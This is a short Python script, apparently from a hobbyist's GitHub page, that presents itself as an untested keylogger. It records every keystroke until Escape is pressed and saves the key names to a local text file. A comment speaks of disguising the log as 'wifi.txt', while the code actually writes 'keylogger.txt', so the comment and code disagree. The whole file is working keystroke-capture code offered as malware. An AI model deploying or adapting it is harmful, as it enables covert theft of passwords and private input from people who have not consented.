# Untested keylogger intended for use on MalekK882’s GitHub page. 
# Made with some valuable advice from a YouTube video by “Murtaza’s Wokshop” on detecting key inputs.

# import necessary modules
import keyboard

# define keylogger function
def keylogger():
    try:
        # record all keyboard events
        key_events = keyboard.record(until='esc')

        # save the key events to a text file
        # the “wifi.txt” folder is in disguise, it actually records the keys. 
        with open('keylogger.txt', 'w') as file:
            for key_event in key_events:
                file.write(key_event.name + '\n')
    finally:
        # clean up after the program finishes
        keyboard.unhook_all()

# call the keylogger function
keylogger()

